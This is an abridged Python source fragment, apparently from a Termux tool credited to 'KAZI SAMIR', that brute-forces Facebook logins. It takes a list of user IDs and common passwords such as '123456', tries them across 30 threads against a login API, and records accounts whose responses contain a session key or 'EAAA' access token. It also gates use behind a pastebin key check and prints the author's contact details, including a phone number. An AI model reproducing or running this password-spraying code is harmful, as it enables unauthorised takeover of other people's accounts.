...
def notice():
	...
	runtxt("\033[0;93m ADMIN FACEBOOK >> \033[0;92mKAZI SAMIR\033[0;92m")
	subprocess.check_output(["am", "start", "https://www.facebook.com/FOURKANUDDIN123"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://pastebin.com/raw/5MuE2h1P').text
			if basesplit in plr:
				key = basesplit
		...
		print ("""\033[1;92m 
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–„â–„â–„       â–ˆâ–ˆâ–ˆâ–„ â–„â–ˆâ–ˆâ–ˆâ–“ â–ˆâ–ˆâ–“ â–ˆâ–ˆâ–€â–ˆâ–ˆâ–ˆ  
â–’â–ˆâ–ˆ    â–’ â–’â–ˆâ–ˆâ–ˆâ–ˆâ–„    â–“â–ˆâ–ˆâ–’â–€â–ˆâ–€ â–ˆâ–ˆâ–’â–“â–ˆâ–ˆâ–’â–“â–ˆâ–ˆ â–’ â–ˆâ–ˆâ–’
â–‘ â–“â–ˆâ–ˆâ–„   â–’â–ˆâ–ˆ  â–€â–ˆâ–„  â–“â–ˆâ–ˆ    â–“â–ˆâ–ˆâ–‘â–’â–ˆâ–ˆâ–’â–“â–ˆâ–ˆ â–‘â–„â–ˆ â–’
  â–’   â–ˆâ–ˆâ–’â–‘â–ˆâ–ˆâ–„â–„â–„â–„â–ˆâ–ˆ â–’â–ˆâ–ˆ    â–’â–ˆâ–ˆ â–‘â–ˆâ–ˆâ–‘â–’â–ˆâ–ˆâ–€â–€â–ˆâ–„  
â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’ â–“â–ˆ   â–“â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–’   â–‘â–ˆâ–ˆâ–’â–‘â–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆâ–“ â–’â–ˆâ–ˆâ–’
...
\033[1;97mâ€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢
     \033[1;92mâž£ \033[1;92mDEVOLPER   :            KAZI SAMIR
     \033[1;91mâž£ \033[1;92mFACEBOOK   :            FOURKAN UDDIN TANVIR
     \033[1;93mâž£ \033[1;92mWHATSAPP   :            01817313151
     \033[1;96mâž£ \033[1;92mGITHUB     :            kazi samir
...
#				exit()
	...
	def email(self):
		...
		try:
			...
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR samir "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G)) 
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;93m[>_] [samir] : \033[0;97m %s/%s -> \033[0;92m [KHAN -OK:%s ]- \033[0;93m[KHAN-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[0;93m[samir-CP] %s|%s\033[0;97m         "%(uid, pw))
